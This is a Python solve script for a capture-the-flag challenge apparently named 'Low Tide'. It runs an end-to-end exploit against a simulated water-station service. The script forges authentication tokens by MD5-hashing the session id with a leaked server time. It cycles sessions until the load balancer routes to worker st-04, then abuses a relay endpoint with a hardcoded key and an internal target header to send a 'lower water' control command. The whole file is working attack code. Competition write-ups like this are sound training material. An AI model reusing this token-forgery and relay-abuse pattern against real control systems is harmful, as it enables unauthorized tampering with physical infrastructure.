#!/usr/bin/env python3
# solve.py — Low Tide: end-to-end relay exploit.
#
# usage: python solve.py
import time
import hashlib
import datetime
import requests

LB = "https://low-tide-lb.ctf.csaw.io"
UA = "StationSync-Agent/2.1"
KEY = "4f9a-77c2-e01d"
HDR = {"X-Relay-Target": "http://10.10.14.31/", "X-Relay-Key": KEY}


class Station:
    def __init__(self):
        self.s = requests.Session()
        self.s.headers["User-Agent"] = UA
        self.sid = None

    def post(self, path, data=None, headers=None, tries=8):
        for _ in range(tries):
            r = self.s.post(f"{LB}{path}", data=data or {}, headers=headers or {}, timeout=25)
            if r.status_code == 429:
                try:
                    wait = float(r.json().get("retry_after", 5))
                except Exception:
                    wait = 5
                time.sleep(wait + 0.4)
                continue
            return r
        return r

    def boot(self):
        self.post("/station/checkin", {"action": "checkin"})
        self.sid = self.s.cookies.get("sid")

    def station_epoch(self):
        j = self.post("/station/checkin", {"action": "checkin", "token": "probe"}).json()
        t = j.get("sync_time")
        if not t:
            return None
        return int(datetime.datetime.strptime(t, "%Y-%m-%dT%H:%M:%SZ")
                   .replace(tzinfo=datetime.UTC).timestamp())

    def token(self):
        return hashlib.md5((self.sid + str(self.station_epoch())).encode()).hexdigest()

    def auth(self):
        return self.post("/station/checkin", {"action": "checkin", "token": self.token()}).json()


# Only st-04 serves the relay. The ALB assigns a worker per connection,
# so keep opening sessions until one lands on st-04.
while True:
    st = Station()
    st.boot()
    if st.auth().get("station_id") == "st-04":
        break
    time.sleep(1.5)

r = st.post(
    "/station/checkin/relay",
    {"action": "checkin", "token": st.token(), "cmd": "CMD:WATER:LOWER:50"},
    HDR,
)
print(r.status_code, r.text)
